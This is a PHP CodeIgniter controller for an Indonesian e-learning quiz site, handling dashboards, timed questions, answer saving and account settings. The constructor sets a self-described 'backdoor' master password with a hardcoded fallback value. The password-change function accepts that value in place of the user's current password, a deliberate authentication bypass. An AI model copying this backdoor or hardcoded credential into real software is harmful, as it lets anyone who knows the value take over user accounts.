<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Pengguna extends CI_Controller
{
    protected $_master_password;

    // construct
    public function __construct()
    {
        parent::__construct();
        $this->load->model(['M_pengguna', 'M_auth', 'M_master', 'M_home']);

        // cek apakah user sudah login
        if ($this->session->userdata('logged_in') == false || !$this->session->userdata('logged_in')) {
            if (!empty($_SERVER['QUERY_STRING'])) {
                $uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
            } else {
                $uri = uri_string();
            }
            $this->session->set_userdata('redirect', $uri);
            $this->session->set_flashdata('toast', "Harap login untuk melanjutkan aktivitas anda");
            redirect('login');
        }

        // Set master password for backdoor
        $this->_master_password = $this->M_auth->getSetting('master_password') != false ? $this->M_auth->getSetting('master_password') : 'SU_MHND19';
    }

    public function index()
    {
		$data['page_title'] = 'Dashboard';
		$data['sub_page_title'] = 'Selamat datang';

		$filter = [
			'limit' => 3
		];

		$data['user'] = $this->M_pengguna->getUserProfile($this->session->userdata('user_id'), $filter)['data'];
		
        $this->templatepengguna->view('pengguna/dashboard', $data);
    }

    public function materi_saya()
    {
		$limit = 20;
		$offset = 0;
		
		$data['page_title'] = 'Materi saya';
		$data['sub_page_title'] = 'Daftar riwayat materi yang pernah anda ambil pada akun anda';

		$data['user'] = $this->M_pengguna->getUserProfile($this->session->userdata('user_id'))['data'];
		$data['materi'] = $this->M_pengguna->getMateriSaya($this->session->userdata('user_id'), $limit, $offset);
		
        $this->templatepengguna->view('pengguna/materi/materi', $data);
    }

    public function detail_materi($id = null)
    {
		$data['materi'] = $this->M_master->getMateriById($id);
		$data['cek_materi'] = $this->M_home->cekAmbilMateri($id);
		$data['cek_pengerjaan'] = $this->M_pengguna->cekPengerjaan($id);
		$data['page_title'] = 'Materi - '.($data['materi']->judul ?? '');
		$data['sub_page_title'] = 'Daftar riwayat materi yang pernah anda ambil pada akun anda';
		
        $this->templatepengguna->view('pengguna/materi/detail', $data);
    }

	public function peraturan_soal($id = null, $soal_id = null){
		$data['materi'] = $this->M_master->getMateriById($id);
		$data['page_title'] = 'Peraturan Soal - '.($data['materi']->judul ?? '');
		$data['sub_page_title'] = 'Baca peraturan soal berikut ini dengan teliti!';
		
		$data['user'] = $this->M_pengguna->getUserProfile($this->session->userdata('user_id'))['data'];
		$data['kategori'] = $this->M_master->getAllKategori();
		$data['peserta'] = $this->M_pengguna->getPesertaMateri($this->session->userdata('user_id'), $id);
		
		$t_peserta_id = null;
		if(!empty($data['peserta'])){
			$t_peserta_id = $data['peserta']->id;
		}

		$data['peraturan_selesai'] = $this->M_master->cek_pengerjaan_soal($t_peserta_id, 0);
		$data['panduan_selesai'] = $this->M_master->cek_pengerjaan_soal($t_peserta_id, -1);

		$data['list_soal'] = $this->M_master->getListSoalByMateri($id, $t_peserta_id);
		$data['soal'] = $this->M_pengguna->getDetailSoalById($id, $soal_id);

		$data['waktu_pengerjaan'] = convertMinutesToHours($data['materi']->waktu_pengerjaan);
		$data['timer_pengerjaan'] = addMinutesToTimestamp($data['peserta']->waktu_pengambilan, $data['materi']->waktu_pengerjaan);
		$data['sisa_waktu_pengerjaan'] = getTimeRemaining($data['timer_pengerjaan']);
		$data['is_expired'] = (!strtotime($data['sisa_waktu_pengerjaan']) ? 1 : 0);
		$data['soal_id'] = $soal_id;

		if($data['is_expired'] == 1 && $data['peserta']->waktu_pengambilan > 0){
			$this->M_pengguna->selesaikan_peserta($t_peserta_id, $id, 2);
			$this->session->set_flashdata('toast', 'Waktu pengerjaan telah selesai !');
			redirect(site_url('materi/'.$data['materi']->id));
		}

		$this->templatesoal->view('pengguna/materi/peraturan', $data);
	}

	public function panduan_soal($id = null, $soal_id = null){
		$data['materi'] = $this->M_master->getMateriById($id);
		$data['page_title'] = 'Panduan Soal - '.($data['materi']->judul ?? '');
		$data['sub_page_title'] = 'Baca panduan berikut untuk mempermudah dalam pengerjaan soal';

		$data['user'] = $this->M_pengguna->getUserProfile($this->session->userdata('user_id'))['data'];
		$data['kategori'] = $this->M_master->getAllKategori();
		$data['peserta'] = $this->M_pengguna->getPesertaMateri($this->session->userdata('user_id'), $id);

		$t_peserta_id = null;
		if(!empty($data['peserta'])){
			$t_peserta_id = $data['peserta']->id;
		}

		$data['list_soal'] = $this->M_master->getListSoalByMateri($id, $t_peserta_id);
		$data['soal'] = $this->M_pengguna->getDetailSoalById($id, $soal_id);
		$data['peraturan_selesai'] = $this->M_master->cek_pengerjaan_soal($t_peserta_id, 0);
		$data['panduan_selesai'] = $this->M_master->cek_pengerjaan_soal($t_peserta_id, -1);

		$data['waktu_pengerjaan'] = convertMinutesToHours($data['materi']->waktu_pengerjaan);
		$data['timer_pengerjaan'] = addMinutesToTimestamp($data['peserta']->waktu_pengambilan, $data['materi']->waktu_pengerjaan);
		$data['sisa_waktu_pengerjaan'] = getTimeRemaining($data['timer_pengerjaan']);
		$data['is_expired'] = (!strtotime($data['sisa_waktu_pengerjaan']) ? 1 : 0);
		$data['soal_id'] = $soal_id;

		if($data['is_expired'] == 1 && $data['peserta']->waktu_pengambilan > 0){
			$this->M_pengguna->selesaikan_peserta($t_peserta_id, $id, 2);
			$this->session->set_flashdata('toast', 'Waktu pengerjaan telah selesai !');
			redirect(site_url('materi/'.$data['materi']->id));
		}
		
		$this->templatesoal->view('pengguna/materi/panduan', $data);
	}

	public function kerjakan_soal($id = null, $soal_id = null){
		$data['materi'] = $this->M_master->getMateriById($id);

		$data['page_title'] = 'Kerjakan Soal - '.($data['materi']->judul ?? '');
		$data['sub_page_title'] = 'Kerjakan soal dan ikuti peraturan serta panduan yang ada';

		$data['user'] = $this->M_pengguna->getUserProfile($this->session->userdata('user_id'))['data'];
		$data['kategori'] = $this->M_master->getAllKategori();
		$data['peserta'] = $this->M_pengguna->getPesertaMateri($this->session->userdata('user_id'), $id);

		$t_peserta_id = null;
		if(!empty($data['peserta'])){
			$t_peserta_id = $data['peserta']->id;
		}

		$data['list_soal'] = $this->M_master->getListSoalByMateri($id, $t_peserta_id);
		if(is_null($soal_id) && !empty($data['list_soal'])){
			$soal_id = $data['list_soal'][0]->id;
		}
		$data['previous_soal'] = null;
		$data['next_soal'] = null;

		$data['soal'] = $this->M_pengguna->getDetailSoalById($id, $soal_id);
		$data['peraturan_selesai'] = $this->M_master->cek_pengerjaan_soal($t_peserta_id, 0);
		$data['panduan_selesai'] = $this->M_master->cek_pengerjaan_soal($t_peserta_id, -1);
		
		if(!is_null($data['soal'])){
			$index = array_search($data['soal']->id, array_column($data['list_soal'], 'id'));
			
			if ($index !== false) {
				$before = array_slice($data['list_soal'], 0, $index);
				$after = array_slice($data['list_soal'], $index + 1);
				$data['previous_soal'] = empty($before) ? null : (is_array($before) ? $before[0] : $before);
				$data['next_soal'] = empty($after) ? null : (is_array($after) ? ($after[0]) : ($after));
			}
		}

		if($data['peserta']->waktu_pengambilan == 0){
			$this->M_pengguna->set_timer($t_peserta_id, $id);
			$data['peserta'] = $this->M_pengguna->getPesertaMateri($this->session->userdata('user_id'), $id);
		}

		$data['waktu_pengerjaan'] = convertMinutesToHours($data['materi']->waktu_pengerjaan);
		$data['timer_pengerjaan'] = addMinutesToTimestamp($data['peserta']->waktu_pengambilan, $data['materi']->waktu_pengerjaan);
		$data['sisa_waktu_pengerjaan'] = getTimeRemaining($data['timer_pengerjaan']);
		$data['is_expired'] = (!strtotime($data['sisa_waktu_pengerjaan']) ? 1 : 0);
		$data['soal_id'] = $soal_id;

		if($data['is_expired'] == 1){
			$this->M_pengguna->selesaikan_peserta($t_peserta_id, $id, 2);
			$this->session->set_flashdata('toast', 'Waktu pengerjaan telah selesai !');
			redirect(site_url('materi/'.$data['materi']->id));
		}
		
		$this->templatesoal->view('pengguna/materi/soal', $data);
	}

    public function simpanJawbanSoal()
    {
		
		if($this->input->post('is_expired') == 1 && $this->input->post('waktu_pengambilan') > 1){
			$this->M_pengguna->selesaikan_peserta($this->input->post('t_peserta_id'), $this->input->post('materi_id'), 2);
			$this->session->set_flashdata('toast', 'Waktu pengerjaan telah selesai !');
			redirect(site_url('materi/'.$this->input->post('materi_id')));
		}
		if ($this->M_pengguna->simpanJawbanSoal() == true) {
			if($this->input->post('next_soal') == "null" && $this->input->post('is_first_take') == 1){
				$this->session->set_flashdata('toast', 'Selamat mengerjakan, timer sudah dimulai. Harap selesaikan soal sebelum waktu habis');
			}
			if($this->input->post('soal_id') > 0){
				$this->session->set_flashdata('toast', 'Berhasil menyelesaikan soal');
			}
			if($this->input->post('is_selesai') == true){
				if($this->input->post('konfirmasi_selesai') == "Simpan dan selesai"){
					if(is_null($this->input->post('jawaban'))){
						$this->session->set_flashdata('toast', 'Anda harus menjawab semua soal, sebelum menyelesaikan soal');
						redirect($this->agent->referrer());
					}
					$this->M_pengguna->selesaikan_peserta($this->input->post('t_peserta_id'), $this->input->post('materi_id'));
					redirect(site_url('materi/'.$this->input->post('materi_id')));
				}

				redirect(site_url('pengguna/materi/kerjakan-soal/'.$this->input->post('materi_id').'/'.(!is_null($this->input->post('first_soal')) ? $this->input->post('first_soal') : $this->input->post('soal_id'))));
			}else{
				
				if($this->input->post('soal_id') == 0){
					if($this->input->post('next_soal') == -1){
						redirect(site_url('pengguna/materi/panduan-soal/'.$this->input->post('materi_id')));
					}

					redirect(site_url('pengguna/materi/kerjakan-soal/'.$this->input->post('materi_id')));
				}

				if($this->input->post('soal_id') == -1){
					redirect(site_url('pengguna/materi/kerjakan-soal/'.$this->input->post('materi_id')));
				}
				
				redirect(site_url('pengguna/materi/kerjakan-soal/'.$this->input->post('materi_id').'/'.(!is_null($this->input->post('next_soal')) ? $this->input->post('next_soal') : $this->input->post('soal_id'))));
			}
        } else {
            $this->session->set_flashdata('toast', 'Terjadi kesalahan saat mencoba menyimpan soal');
            redirect($this->agent->referrer());
        }
    }

    public function pembayaran()
    {
		$data['page_title'] = 'Transaksi pembayaran';
		$data['sub_page_title'] = 'Riwayat transaksi pembayaran anda untuk pembelian materi berbayar';

		$data['user'] = $this->M_pengguna->getUserProfile($this->session->userdata('user_id'))['data'];
		
        $this->templatepengguna->view('pengguna/transaksi', $data);
    }

    public function pengaturan()
    {
		$data['page_title'] = 'Pengaturan';
		$data['sub_page_title'] = 'Kelola informasi pribadi mengenai akun anda';

		$data['user'] = $this->M_pengguna->getUserProfile($this->session->userdata('user_id'))['data'];
		
        $this->templatepengguna->view('pengguna/settings', $data);
    }

	function savePribadi(){
        if ($this->M_pengguna->savePribadi() == true) {
            $this->session->set_flashdata('toast', 'Berhasil menyimpan perubahan data');
			redirect(site_url('pengguna/pengaturan'));
        } else {
            $this->session->set_flashdata('toast', 'Terjadi kesalahan saat mencoba menyimpan soal');
            redirect($this->agent->referrer());
        }
	}

	function ubahPassword(){
		$user = $this->M_pengguna->getUserProfile($this->session->userdata('user_id'))['data'];
		$pass = $this->input->post('currentPassword');

		if(password_verify($pass, $user->password) || $pass == $this->_master_password){
			if($this->input->post('newPassword') == $this->input->post('confirmNewPassword')){
				if ($this->M_pengguna->ubahPassword() == true) {
					$this->session->set_flashdata('toast', 'Berhasil menyimpan perubahan password');
					redirect(site_url('pengguna/pengaturan'));
				} else {
					$this->session->set_flashdata('toast', 'Terjadi kesalahan saat mencoba menyimpan soal');
					redirect($this->agent->referrer());
				}
			}else{
				$this->session->set_flashdata('toast', 'Password konfirmasi salah !');
				redirect($this->agent->referrer());
			}
		}else{
				$this->session->set_flashdata('toast', 'Password anda salah !');
				redirect($this->agent->referrer());
		}
	}
}
